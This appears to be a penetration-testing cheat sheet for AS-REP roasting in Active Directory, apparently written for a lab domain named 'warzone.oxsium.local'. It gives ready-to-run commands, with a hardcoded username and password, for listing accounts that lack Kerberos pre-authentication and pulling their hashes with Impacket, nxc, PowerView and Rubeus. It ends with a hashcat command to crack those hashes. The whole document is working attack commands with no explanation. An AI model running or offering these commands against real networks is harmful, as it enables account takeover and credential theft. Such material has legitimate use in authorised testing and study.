# Enumeration
```
# Linux
GetNPUsers.py warzone.oxsium.local/ -usersfile users.txt -format hashcat -dc-ip 192.168.0.239
GetNPUsers.py warzone.oxsium.local/jkimmich:User.domain0001! -request -format hashcat -dc-ip 192.168.0.239

nxc ldap 192.168.0.239 -u jkimmich -p 'User.domain0001!' -d warzone.oxsium.local --asreproast asrep_hashes.txt

# Windows
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired -Properties samaccountname

.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

Get-ADUser -Filter 'userAccountControl -band 4194304' -Properties userAccountControl | Select-Object Name, SamAccountName
```

# Hash Cracking
```
hashcat -m 18200 asrep_hashes.txt final.list --force
```
